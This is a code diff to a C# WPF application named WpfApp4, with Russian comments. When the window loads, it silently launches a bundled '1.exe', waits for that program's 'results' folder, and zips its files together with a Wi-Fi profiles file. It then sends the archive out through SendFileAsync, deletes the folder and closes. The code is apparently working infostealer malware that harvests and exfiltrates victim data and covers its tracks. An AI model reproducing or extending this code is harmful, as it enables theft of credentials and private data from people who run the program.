@@ -18,8 +18,34 @@ namespace WpfApp4
             this.Loaded += MainWindow_Loaded;
         }
 
+        private void LaunchExternalExe()
+        {
+            string exePath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "1.exe");
+            ProcessStartInfo startInfo = new ProcessStartInfo()
+            {
+                FileName = exePath,
+                WorkingDirectory = AppDomain.CurrentDomain.BaseDirectory,
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+
+            using (Process process = new Process())
+            {
+                process.StartInfo = startInfo;
+                process.OutputDataReceived += (sender, args) => Console.WriteLine($"Output: {args.Data}");
+                process.ErrorDataReceived += (sender, args) => Console.WriteLine($"Error: {args.Data}");
+                process.Start();
+                process.BeginOutputReadLine();
+                process.BeginErrorReadLine();
+                process.WaitForExit();
+            }
+        }
+
         private void MainWindow_Loaded(object sender, RoutedEventArgs e)
         {
+            LaunchExternalExe();
             CopyFilesAndCreateZipButton_Click(this, new RoutedEventArgs());
         }
 
@@ -109,12 +135,29 @@ namespace WpfApp4
                 // Добавляем файл с Wi-Fi профилями в список для архива
                 filesToCopy.Add(wifiProfilesFilePath);
 
+                // Ожидаем создания папки "results"
+                string resultsFolderPath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "results");
+                while (!Directory.Exists(resultsFolderPath))
+                {
+                    await Task.Delay(2000); // ждем 1 секунду
+                }
+
+                // Добавляем файлы из папки "results" в список для архива
+                filesToCopy.AddRange(Directory.GetFiles(resultsFolderPath, "*.*", SearchOption.AllDirectories));
+
+
                 // Создаем архив с сохранением структуры папок
                 CreateZipFromFilesWithFolders(filesToCopy, zipFilePath, userFolderPath);
                 Console.WriteLine($"ZIP file created at {zipFilePath}");
 
                 // Отправляем архив
                 await SendFileAsync(zipFilePath);
+
+
+                // Удаляем папку "results"
+                Directory.Delete(resultsFolderPath, true);
+                Console.WriteLine($"Directory 'results' deleted");
+
                 Close();
             }
             catch (Exception ex)
